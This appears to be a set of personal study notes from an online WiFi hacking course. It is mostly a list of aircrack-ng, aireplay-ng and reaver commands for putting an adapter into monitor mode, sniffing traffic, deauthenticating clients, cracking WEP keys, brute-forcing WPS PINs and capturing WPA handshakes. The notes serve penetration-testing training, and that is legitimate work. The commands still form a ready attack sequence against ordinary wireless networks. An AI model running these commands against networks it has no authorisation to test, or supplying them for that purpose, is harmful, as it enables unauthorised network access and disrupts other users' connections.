# Learn Network Hacking From Scratch (WiFi & Wired)
https://www.udemy.com/course/wifi-hacking-penetration-testing-from-scratch/

## Wireless Modes

ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig

## Packet Sniffing - Airodump-ng

// Capture all
airodump-ng wlan0

==============

// Targeted (writing to file)
airodump-ng --bssid <MAC> --channel <channel#> --write test wlan0

## DeAuth

aireplay-ng --deauth <NumDeauthPackets> -a <NetworkMAC> -c <ClientMAC> wlan0

## WEP

//Break 24 bit initialization vector by collecting lots of packets and analyzing them
//First run airodump-ng against WEP device to capture data, write to file

aircrack-ng <filename.cap>
- remove : from key and connect to access point

==============

//Force access point to generate new IV (if not much traffic on network to create data)
//Get MAC from wireless adaptor from first six pairs of `unspec` field in `ifconfig`, replace - with :

aireplay-ng --fakeauth 0 -a <NetworkMAC> -h <WirelessAdaptorMAC> wlan0

## WPA/WPA2

### WPS Exploit (if enabled on router)

wash --interface wlan0
//Start Brute force of PIN
reaver --bssid <NetworkMAC> --channel 1 --interface wlan0 -vvv --no-associate
//Associate with network, fake auth
aireplay-ng --fakeauth 30  -a <NetworkMAC> -h <WirelessAdaptorMAC> wlan0

### Capture a Handshake and use it to get network key

airodump-ng --bssid <MAC> --channel <channel#> --write wpa_handshake wlan0
//Wait for device to connect, or conduct deauth attack (4 packets should work)
aireplay-ng --deauth <NumDeauthPackets> -a <NetworkMAC> -c <ClientMAC> wlan0
